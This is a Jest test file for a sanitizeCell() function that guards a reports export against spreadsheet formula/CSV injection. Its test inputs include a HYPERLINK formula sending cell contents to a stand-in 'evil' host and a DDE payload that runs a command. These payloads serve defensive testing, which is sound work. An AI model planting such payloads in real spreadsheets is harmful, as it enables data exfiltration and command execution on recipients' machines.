import { sanitizeCell } from "@/utils/spreadsheet";

/**
 * Why this was never tested before:
 *
 * The reports export built its worksheet rows inline and handed them straight
 * to XLSX.utils.json_to_sheet with no sanitization. There was no named
 * function, and the only observable output was an opaque .xlsx binary — so
 * there was nothing a unit test could target, and the whole class of
 * spreadsheet formula/CSV injection slipped through every prior pass. Pulling
 * the neutralization into sanitizeCell() creates the seam these tests exercise.
 */
describe("sanitizeCell — spreadsheet formula/CSV injection", () => {
  it("neutralizes the realistic exfiltration payload via a recipient name", () => {
    const payload = '=HYPERLINK("http://evil/?"&A1&B1,"click")';
    const out = sanitizeCell(payload);
    expect(out.startsWith("'")).toBe(true);
    expect(out).toBe(`'${payload}`);
    // The dangerous char is no longer in the leading position.
    expect(/^[=+\-@\t\r]/.test(out)).toBe(false);
  });

  it("neutralizes the legacy DDE command payload", () => {
    expect(sanitizeCell("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1");
  });

  it.each([
    ["=1+1", "'=1+1"],
    ["+1+1", "'+1+1"],
    ["-1+1", "'-1+1"],
    ["@SUM(A1:A9)", "'@SUM(A1:A9)"],
    ["\tleading tab", "'\tleading tab"],
    ["\rleading cr", "'\rleading cr"],
  ])("prefixes a value beginning with a formula trigger: %j", (input, expected) => {
    expect(sanitizeCell(input)).toBe(expected);
  });

  it.each([
    "",
    "O'Brien", // apostrophe is not leading — safe
    "Renée",
    "Jean-Luc Picard", // hyphen is interior, not leading
    "A=B=C", // equals is interior
    "1234567", // card number as string
    "Active",
    "Transit Dept",
    "note with, commas and \"quotes\"",
  ])("leaves a safe value unchanged: %j", (input) => {
    expect(sanitizeCell(input)).toBe(input);
  });

  it("only inspects the leading character, not later ones", () => {
    // A value whose FIRST char is safe stays untouched even if it contains
    // formula characters later.
    expect(sanitizeCell("Smith =A1")).toBe("Smith =A1");
  });

  it("does not double-prefix an already-safe apostrophe value", () => {
    // Leading apostrophe is not a formula trigger, so it is left alone.
    expect(sanitizeCell("'already quoted")).toBe("'already quoted");
  });
});
